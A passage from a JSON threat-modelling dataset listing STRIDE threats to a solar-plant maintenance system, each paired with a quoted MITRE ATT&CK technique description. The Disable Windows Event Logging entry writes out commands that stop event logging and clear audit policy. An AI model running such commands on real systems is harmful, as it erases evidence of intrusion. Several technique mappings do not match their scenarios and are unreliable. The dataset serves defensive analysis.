                "id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
                "technique_id": "T1055"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "9",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof sensor data being sent to the Data Logger to provide false information, such as incorrect power or voltage readings.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has network access",
                    "Role": "Attacker",
                    "Condition": "Valid if the network is not adequately segmented or protected."
                },
                {
                    "Assumption": "Sensors lack strong authentication mechanisms",
                    "Role": "System Designer",
                    "Condition": "Valid if sensors do not use cryptographic authentication."
                },
                {
                    "Assumption": "Data Logger fails to validate data authenticity",
                    "Role": "Data Logger",
                    "Condition": "Valid if Data Logger does not verify data integrity and source."
                }
            ],
            "Potential Impact": "Loss of data integrity may lead to incorrect maintenance actions and potential hardware failures.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "sensor data",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An adversary impersonates an employee to access the Dashboard and view sensitive operational data.",
            "Assumptions": [
                {
                    "Assumption": "Dashboard lacks multi-factor authentication",
                    "Role": "System Designer",
                    "Condition": "Valid if the Dashboard does not enforce multi-factor authentication."
                },
                {
                    "Assumption": "Weak password policies",
                    "Role": "User",
                    "Condition": "Valid if employees use easily guessable passwords."
                },
                {
                    "Assumption": "Phishing attack succeeds",
                    "Role": "Attacker",
                    "Condition": "Valid if users fall victim to phishing attacks."
                }
            ],
            "Potential Impact": "Unauthorized data access can lead to sensitive information disclosure and potential misuse.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "dashboard",
                "password",
                "phishing"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker manipulates communication between the Data Logger and Receiver, injecting false data into the system.",
            "Assumptions": [
                {
                    "Assumption": "Unencrypted communication channels",
                    "Role": "System Administrator",
                    "Condition": "Valid if communication between Data Logger and Receiver is not encrypted."
                },
                {
                    "Assumption": "Network lacking intrusion detection mechanisms",
                    "Role": "Network Administrator",
                    "Condition": "Valid if the network does not monitor for abnormal activities."
                },
                {
                    "Assumption": "Existing knowledge of the protocol",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has prior knowledge of the data protocol in use."
                }
            ],
            "Potential Impact": "Corruption of data integrity, leading to flawed predictive maintenance and potential system failures.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network communication",
                "data injection",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the AI/ML models stored on the TOREADOR Platform, leading to inaccurate predictions for maintenance and power flow optimization.",
            "Assumptions": [
                {
                    "Assumption": "Attacker gains access to the TOREADOR Platform",
                    "Role": "Attacker",
                    "Condition": "Valid if access controls are weak or compromised."
                },
                {
                    "Assumption": "Lack of model integrity checks",
                    "Role": "System Designer",
                    "Condition": "Valid if models are not accompanied by cryptographic integrity checks."
                },
                {
                    "Assumption": "Insufficient monitoring of model changes",
                    "Role": "System Administrator",
                    "Condition": "Valid if there is no logging and alerting for modifications."
                }
            ],
            "Potential Impact": "Loss of data integrity and poisoned AI/ML models result in erroneous maintenance and optimization decisions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "AI/ML models",
                "platform",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Code Signing",
                "description": "Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)(Citation: EclecticLightChecksonEXECodeSigning)\n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system. ",
                "id": "attack-pattern--32901740-b42c-4fdd-bc02-345b5dc57082",
                "technique_id": "T1553.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the configuration files of the Data Logger to reroute data to a malicious server.",
            "Assumptions": [
                {
                    "Assumption": "Write access to configuration files is inadequately protected",
                    "Role": "System Administrator",
                    "Condition": "Valid if access to configuration files is not restricted."
                },
                {
                    "Assumption": "Local root-of-trust can be bypassed",
                    "Role": "Attacker",
                    "Condition": "Valid if local root-of-trust is weak or misconfigured."
                },
                {
                    "Assumption": "Lack of file integrity monitoring",
                    "Role": "System Administrator",
                    "Condition": "Valid if no systems are in place to detect changes in configuration files."
                }
            ],
            "Potential Impact": "Loss of data confidentiality due to data leakage and potential system compromise.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "configuration files",
                "data rerouting",
                "server"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
                "technique_id": "T1037"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An adversary compromises the firmware of sensors, leading to the collection of incorrect or maliciously altered sensor data.",
            "Assumptions": [
                {
                    "Assumption": "Sensors have programmable firmware",
                    "Role": "System Designer",
                    "Condition": "Valid if sensor firmware can be updated post-deployment."
                },
                {
                    "Assumption": "Firmware update process lacks security",
                    "Role": "System Administrator",
                    "Condition": "Valid if firmware updates are not signed or authenticated."
                },
                {
                    "Assumption": "Physical access to sensors",
                    "Role": "Attacker",
                    "Condition": "Valid if sensors are deployed in accessible locations without physical security."
                }
            ],
            "Potential Impact": "Loss of data integrity resulting in incorrect predictions and operational inefficiencies.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "sensors",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee manipulates the data received from Data Logger before forwarding it to the Receiver, and denies any wrongdoing.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging and monitoring",
                    "Role": "System Administrator",
                    "Condition": "Valid if there are no logs recording data transactions."
                },
                {
                    "Assumption": "Lack of non-repudiation mechanisms",
                    "Role": "System Designer",
                    "Condition": "Valid if there are no cryptographic measures to ensure data origin."
                },
                {
                    "Assumption": "Insider access to Data Logger",
                    "Role": "Employee",
                    "Condition": "Valid if employees have direct access to modify data."
                }
            ],
            "Potential Impact": "Loss of data integrity with the potential for manipulated data harming system effectiveness.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "monitoring",
                "insider threat"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker interacts with the TOREADOR Platform using stolen credentials to manipulate stored data.",
            "Assumptions": [
                {
                    "Assumption": "Stolen or compromised credentials",
                    "Role": "Attacker",
                    "Condition": "Valid if credentials can be phished or otherwise obtained."
                },
                {
                    "Assumption": "No multi-factor authentication",
                    "Role": "System Designer",
                    "Condition": "Valid if the system relies on single-factor authentication."
                },
                {
                    "Assumption": "Action logs are not tamper-proof",
                    "Role": "System Administrator",
                    "Condition": "Valid if logs can be altered or deleted."
                }
            ],
            "Potential Impact": "Loss of data integrity and unauthorized data modifications leading to faulty model outputs.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "stolen credentials",
                "data manipulation",
                "logging"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user accesses the Dashboard and conducts unauthorized changes to the maintenance schedules, denying any responsibility.",
            "Assumptions": [
                {
                    "Assumption": "Lack of audit trails for user actions",
                    "Role": "System Administrator",
                    "Condition": "Valid if changes are not tracked or logged."
                },
                {
                    "Assumption": "Weak authentication mechanisms",
                    "Role": "System Designer",
                    "Condition": "Valid if inadequate authentication methods are used."
                },
                {
                    "Assumption": "Insufficient role-based access control",
                    "Role": "System Designer",
                    "Condition": "Valid if roles and permissions are not clearly defined."
                }
            ],
            "Potential Impact": "Loss of data integrity with mismanagement of maintenance schedules potentially causing system failures.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "dashboard",
                "unauthorized changes",
                "audit trails"
            ],
            "mitre_technique": {
                "name": "Cloud Service Dashboard",
                "description": "An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)\n\nDepending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.",
                "id": "attack-pattern--e49920b0-6c54-40c1-9571-73723653205f",
                "technique_id": "T1538"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An adversary intercepts data communicated between the Data Logger and the Receiver, gaining access to sensitive operational data.",
            "Assumptions": [
                {
                    "Assumption": "Unencrypted data transmission",
                    "Role": "System Administrator",
                    "Condition": "Valid if data is transmitted in plain text."
                },
                {
                    "Assumption": "Network lacks secure protocols",
                    "Role": "Network Administrator",
                    "Condition": "Valid if no secure communication protocols are in place."
                },
                {
                    "Assumption": "Attacker has network interception capabilities",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker has the tools and access necessary for interception."
                }
            ],
            "Potential Impact": "Loss of data confidentiality leading to potential exposure of operational details and sensitive data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "unencrypted communication",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive metadata related to solar power plants is accessed by unauthorized individuals through the TOREADOR Platform.",
            "Assumptions": [
                {
                    "Assumption": "Weak access controls on metadata",
                    "Role": "System Administrator",
                    "Condition": "Valid if metadata access is not adequately restricted."
                },
                {
                    "Assumption": "Sensitive metadata is stored in plain text",
                    "Role": "System Designer",
                    "Condition": "Valid if metadata is not encrypted."
                },
                {
                    "Assumption": "Insufficient monitoring of data access",
                    "Role": "System Administrator",
                    "Condition": "Valid if there is no logging/reporting of access to sensitive data."
                }
            ],
            "Potential Impact": "Loss of data confidentiality, leading to potential misuse or exploitation of operational metadata.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "metadata",
                "unauthorized access",
                "platform"
            ],
            "mitre_technique": {
                "name": "Code Signing",
                "description": "Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries (Citation: Janicab). The certificates used during an operation may be created, forged, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates)\n\nCode signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)\n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.",
                "id": "attack-pattern--1b84d551-6de8-4b96-9930-d177677c3b1d",
                "technique_id": "T1116"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "AI/ML training data is exposed during its transfer to the cloud environment, revealing sensitive information about the solar power grid and its operations.",
            "Assumptions": [
                {
                    "Assumption": "Unsecured data transfer protocols",
                    "Role": "System Design",
                    "Condition": "Valid if data is transferred without encryption."
                },
                {
                    "Assumption": "Storage of sensitive data without encryption",
                    "Role": "Cloud Administrator",
                    "Condition": "Valid if AI/ML data is stored unencrypted in the cloud."
                },
                {
                    "Assumption": "Cloud environment lacks proper access controls",
                    "Role": "Cloud Administrator",
                    "Condition": "Valid if cloud storage access is not adequately managed."
                }
            ],
            "Potential Impact": "Loss of data confidentiality, compromising sensitive operational data and business intelligence.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data transfer",
                "cloud storage",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the Data Logger with malformed data packets, overwhelming it and causing it to malfunction.",
            "Assumptions": [
                {
                    "Assumption": "Data Logger lacks rate limiting",
                    "Role": "System Designer",
                    "Condition": "Valid if rate limiting measures are not implemented."
                },
                {
                    "Assumption": "Network is not adequately monitored",
                    "Role": "Network Administrator",
                    "Condition": "Valid if there is no active monitoring for abnormal network behavior."
                },
                {
                    "Assumption": "Attacker has access to the network",
                    "Role": "Attacker",
                    "Condition": "Valid if network access controls are insufficient."
                }
            ],
            "Potential Impact": "Loss of system availability as the Data Logger becomes unresponsive, interrupting data collection and processing.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "data flooding",
                "network",
                "malformed packets"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A distributed denial of service (DDoS) attack targets the TOREADOR Platform, overwhelming it and preventing normal operation.",
            "Assumptions": [
                {
                    "Assumption": "Platform is publicly accessible",
                    "Role": "System Designer",
                    "Condition": "Valid if the TOREADOR Platform is exposed to the public internet."
                },
                {
                    "Assumption": "Lack of DDoS mitigation strategies",
                    "Role": "System Administrator",
                    "Condition": "Valid if no DDoS protection mechanisms are in place."
                },
                {
                    "Assumption": "High bandwidth attack capability",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker can generate a vast amount of malicious traffic."
                }
            ],
            "Potential Impact": "Loss of system availability leading to interruptions in predictive maintenance and power flow optimization services.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "platform",
                "public internet"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious code is executed on the sensors, causing them to repeatedly restart and become non-functional.",
            "Assumptions": [
                {
                    "Assumption": "Sensors lack malware protection",
                    "Role": "System Designer",
                    "Condition": "Valid if sensors do not have built-in mechanisms for malware detection."
                },
                {
